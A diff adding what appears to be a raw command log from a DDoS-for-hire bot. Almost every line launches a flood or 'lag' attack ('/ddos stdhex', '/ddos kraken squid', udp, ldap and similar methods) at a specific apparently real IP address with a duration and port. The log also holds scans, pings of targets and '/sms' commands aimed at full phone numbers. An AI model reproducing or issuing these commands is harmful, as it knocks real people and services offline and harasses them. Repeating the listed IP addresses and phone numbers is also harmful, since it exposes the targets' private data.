@@ -1,0 +1,277 @@
+/plans
+/lag 68.228.254.197
+/xboxcode
+/ddos std 67.175.78.35
+/ddos std 67.175.78.35 120 80
+/ping
+/ddos std 110.144.201.113 120 80
+/ddos dns 73.56.113.111 120 80
+/ddos ldap 73.56.113.111 120 80
+/ddos std 73.56.113.111 120 80
+/ddos std 98.184.95.148 120 80
+/vpn
+/method
+/methods
+/ddos nfo 98.184.95.148 120 80
+/ddos udp 98.184.95.148 120 80
+/nmapsv 174.58.36.198
+/lag 76.222.208.53
+/lag std 76.222.208.53 0 120 9
+/ping 76.222.208.53
+/ddos std 76.222.208.53 120 80
+/ddos std 73.82.176.177 120 80
+/ping
+/ddos stdhex 143.59.137.169 120 80
+/ddos stdhex 73.82.176.177 120 80
+/ddos stdhex 73.82.176.177 120 80
+/ddos std 73.91.23.90 60 80
+/ddos stdhex 71.232.55.120 120 80
+/ddos stdhex 173.67.244.188 120 80
+/ddos std 173.67.244.188 120 80
+/ddos std 71.76.232.191 120 80
+/tr4p
+/plans
+/ddos std 174.119.252.107 120 80
+/ddos stdhex 66.189.116.59 120 80
+/ddos stdhex 98.144.171.167 120 80
+/ddos stdhex 24.6.160.52 120 80
+/ddos stdhex 206.71.201.71 120 80
+/ddos stdhex 50.123.174.150 120 80
+/ ping
+/ping 50.123.174.150
+/ddos stdhex 47.210.158.35 120 80
+/ddos stdhex 67.85.39.184 120 80
+/ping 67.85.39.184
+/ddos stdhex 160.2.199.186 120 80
+/ping 160.2.199.186
+/ddos stdhex 67.174.54.204 120 80
+/ddos stdhex 97.81.209.223 1000 80
+/ddos stdhex 97.81.209.223 120 80
+/ping 97.81.209.223
+/ddos stdhex 50.25.27.34 120 80
+/ddos stdhex 69.245.214.215 120 80
+/ping 69.245.214.215
+/ddos stdhex 98.110.133.239 120 80
+/ddos stdhex 98.30.237.56 120 80
+/ddos stdhex 24.29.75.186 120 80
+/ping 24.29.75.186
+/plan
+/ddos stdhex  73.255.197.249 120 80
+/ddos stdhex 100.1.18.182 120 80
+/ping 100.1.18.182
+/ping 100.1.18.182
+/ ping 100.1.18.182
+/smash
+/sms
+/sms 9418225987
+/sms9418225987
+/sms8225987
+/plans
+/ddos stdhex 67.44.160.60 120 80
+/ping 67.44.160.60
+/ddos stdhex 184.97.60.184 1200 80
+/ping 184.97.60.184
+/ddos stdhex 99.71.208.131 1200 80
+/ping 99.71.208.131
+/ddos stdhex 75.40.25.65 700 80
+/ddos stdhex 68.226.196.84 1200 80
+/ddos stdhex 69.132.233.5 1200 80
+/ddos stdhex 50.4.168.64 700 80
+/ddos stdhex 50.4.168.64 1200 80
+/ddos stdhex 92.40.180.152 1200 80
+/ddos stdhex 73.163.125.202 1200 80
+/ping 73.163.125.202
+/ddos stdhex 76.109.213.89 1200 80
+/ddos stdhex 69.245.214.215 1200 80
+/ddos std 24.14.1.183. 345 80
+/ping 24.14.1.183
+/ddos stdhex 69.245.214.215 1200 80
+/ddos stdhex 62.157.49.18 1200 80
+/ddos stdhex 71.243.128.168 1200 80
+/lag 98.186.213.35
+/lag stdhex 98.186.213.35 0 1000 6 80
+/ddos stdhex 98.186.213.35 650 80
+/ddos stdhex 98.186.213.35 1200 80
+/ddos stdhex 47.204.252.63 1200 80
+/ddos stdhex 66.68.97.99 1200 80
+/ddos stdhex 47.185.223.148 1200 80
+/ddos stdhex 66.68.97.99 1200 80
+/ping 83.26.170.58
+/ddos stdhex 71.91.181.119 1200 80
+/ddos stdhex 206.255.187.178 1200 80
+/sms
+/sms 19412679584
+/sms19412679584
+/lag stop
+/lagstop
+/ddos stdhex 76.31.141.52 1200 80
+/ping 76.31.141.52
+/ddos stdhex 98.220.67.93
+/ddos stdhex 98.220.67.93 1200 80
+/ddos stdhex 67.184.170.197 1200 80
+/ping 67.184.170.197
+/ddos stdhex 67.184.170.197 1200 80
+/ddos stdhex 45.47.78.128 1200 80
+/ddos stdhex 47.26.48.51 1200 80
+/ddos stdhex 45.47.78.128 1200 80
+/ddos stdhex 45.47.78.128 1200 80
+/ddos stdhex 75.164.189.217 1200 80
+/ddos stdhex 70.121.140.33 1200 80
+/ddos stdhex 70.121.140.33 1200 80
+/ping 70.121.140.33
+/ddos stdhex 172.6.142.10 1200 80
+/ddos stdhex 108.195.120.186 1200 80
+/ping 172.6.142.10
+/ddos stdhex 73.209.108.111 1200 80
+/ping 73.209.108.111
+/ddos stdhex 73.209.108.111 1200 80
+/ddos ack 73.209.108.111 1200 80
+/ddos vse 73.209.108.111 1200 80
+/ddos stdhex 97.96.37.185 500 80
+/ping 97.96.37.185
+/ping 97.96.37.185
+/ddos stdhex 65.33.157.218 1200 80
+/ping 97.96.37.185
+/ping 97.96.37.185
+/ping 97.96.37.185
+/ddos stdhex 47.132.86.235 1200 80
+/ddos stdhex 73.16.135.183 1200 80
+/ddos stdhex 75.131.78.201 1200 80
+/ddos stdhex 73.209.108.111 1200
+/ddos stdhex 12.9.208.2 442 80
+/ddos stdhex 108.88.254.113 1200 80
+/ddos stdhex 76.117.134.111 800 80
+/ddos stdhex 96.41.78.64 1200 80
+/ddos stdhex 71.224.146.84 1200 80
+/ddos stdhex 162.196.95.189 1200 80
+/ddos stdhex 68.118.61.79 1200 80
+/ddos stdhex 65.33.157.218 1200 80
+/ddos stdhex 71.63.24.111 1200 80
+/ddos stdhex 174.58.57.236 1200 80
+/ddos stdhex 100.1.18.182 1200 80
+/ddos stdhex 173.24.15.2 1200 80
+/ddos stdhex 75.64.14.136 1200 80
+/ddos stdhex 172.1.82.138 1200 80
+/ddos stdhex 67.184.174.164 1200 80
+/ddos stdhex 177.126.238.230 1200 80
+/ping 177.126.238.230
+/ddos stdhex 72.39.142.225 1200 80
+/ddos stdhex 68.104.112.80 1200
+/ddos stdhex 174.97.126.160 1200 80
+/ddos stdhex 174.97.126.160 1200 80
+/ddos stdhex 99.62.19.58 1200 80
+/ddos
+/ddos stdhex 174.48.85.1 120 80
+/ddos stdhex 98.30.3.33 120 80
+/ping 98.30.3.33
+/ddos stdhex 24.194.166.210 1200 80
+/ping 24.194.166.210
+/ping 24.194.166.210
+/ddos stdhex 174.197.195.122 1200 80
+/ddos stdhex 174.197.195.122 400 80
+/ddos stdhex 96.8.253.251 1200 80
+/ddos stdhex 96.231.239.128 1200 80
+/ddos stdhex 73.91.23.90 300 80
+/ddos stdhex 73.91.23.90 300 80
+/ddos squidmethod 73.91.23.90
+/methods
+/ddos squid 73.91.23.90 300 80
+/ddos squid 98.183.71.184 1200 80
+/ddos stdhex 35.137.117.137 1200 80
+/ddos squid 35.137.117.137 1200 80
+/ddos squid 174.130.89.76 1200 80
+/plan
+/ddos
+/ddos squid 174.58.57.236 1200 80
+/method
+/methods
+/ddos std 174.58.57.236 1200 80
+/ddos Kraken squid 174.58.57.236 1200 80
+/ping 172.58.155.19
+/ping 172.58.155.19
+/xboxcode
+/xboxcode
+/ddos kraken squid 67.249.70.178 1200 80
+/ddos kraken squid 72.186.71.201 1200 80
+/ddos kraken stdhex 73.209.108.111 1200 80
+/ddos squid 73.209.108.111
+/ddos kraken squid 73.209.108.111 1200 80
+/ddos kraken squid 24.156.192.166 1200 80
+/ddos kraken squid 68.228.117.55 1200 80
+/ddos kraken squid 65.33.157.218 1200 80
+/ddos kraken udpplain 98.219.32.28 1200 80
+/methods
+/method
+/lagstop 73.62.6.128
+/ddos kraken udpplain 70.225.27.49 1200 80
+/ddos kraken std 69.105.145.183 1200   80
+/ping 69.105.145.183
+/ddos kraken squid 73.58.0.212 1200 80
+/ddos kraken squid 172.58.155.19    1200 80
+/ddos kraken squid 70.15.11.18 1200 80
+/ddos kraken squid 47.152.25.217 1200 80
+/ddos kraken squid 68.51.56.30 682 80
+/ping 68.51.56.30
+/ddos kraken squid 174.194.11.86 1200 80
+/ddos kraken squid 98.194.190.47 1200 80
+/ddos kraken squid 172.58.155.19 1200 80
+/ddos kraken squid 73.214.217.72 1200 80
+/ddos kraken squid 124.190.156.39 1200 80
+/ddos kraken squid 47.201.58.199 1200 80
+/ddos kraken squid 5.66.25.180 1200 80
+/ddos kraken squid 151.229.251.246 1200 80
+/ddos kraken squid 104.251.247.2 1200 80
+/methods
+/ddos ovh-smash 104.251.247.2 700
+/ddos kraken squid 69.141.252.131 1200 80
+/ddos kraken squid 213.31.61.93 1200 80
+/ddos kraken squid 172.101.232.227 700 80
+/ddos kraken squid 74.74.255.2 952 80
+/ddos Godzilla stdhex 92.2.233.223 842 80
+/ddos kraken squid 92.2.233.223 842 80
+/ddos kraken squid 71.132.186.226 400 80
+/plan
+/ddos kraken squid 508 80
+/ddos kraken squid 174.96.78.82 508 80
+/ping 174.96.78.82
+/ddos kraken squid 68.129.104.148  800 80
+/ddos kraken squid 65.128.58.88 800 80
+/ddos kraken squid 72.84.126.18 700 90
+/ddos kraken squid 68.84.143.252 700 80
+/ddos kraken squid 70.177.59.198 700 80
+/ddos kraken squid 70.118.255.234 600 80
+/ddos kraken squid 173.178.44.8 400 80
+/ddos kraken squid 64.228.15.192 200 80
+/ddos kraken squid 50.88.107.57 500 80
+/ddos kraken Squid 135.26.202.154 800 80
+/ddos kraken squid 74.77.65.143 300 80
+/ddos kraken squid 50.115.241.14 300 80
+/ddos kraken squid 71.222.173.229 400 80
+/ddos kraken squid 97.100.138.248 800 80
+/ping 97.100.138.248
+/ddos kraken squid 73.52.126.109 1200 80
+/ddos kraken squid 47.42.39.121 500 80
+/ddos kraken squid 47.224.70.191 300
+/ddos kraken squid 24.177.212.241 120 80
+/ddos kraken squid 68.103.61.186 400 80
+/ ddos kraken squid 210.50.119.246 600 80
+/ping 210.50.119.246
+/ddos kraken squid 98.242.192.178 500 80
+/ddos Godzilla stdhex 98.242.192.178 700 80
+/ddos Godzilla std 98.242.192.178 700 80
+/ddos Godzilla std 98.242.192.178 120 80
+/ddos kraken squid 173.80.113.223 700 80
+/ddos kraken squid 75.158.219.179 1200 80
+/ddos kraken squid 104.129.214.141 500 80
+/ddos kraken squid 104.129.214.141 30 80
+/plan
+/ddos kraken squid 45.25.25.250 500 80
+/ping 45.25.25.250
+/ddos kraken squid 35.187.132.103 1200 80
+/ddos kraken squid 35.187.132.103 120 80
+/plan
+/ddos Godzilla vse 35.187.132.103 120 80
+[Wed Jul 29 2020 16:55:04 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 104.59.49.240 400 80
+[Wed Jul 29 2020 17:15:41 GMT-1100 (Samoa Standard Time)] /Zoltan
+[Wed Jul 29 2020 17:18:27 GMT-1100 (Samoa Standard Time)] /plan
+[Wed Jul 29 2020 17:20:46 GMT-1100 (Samoa Standard Time)] /plan
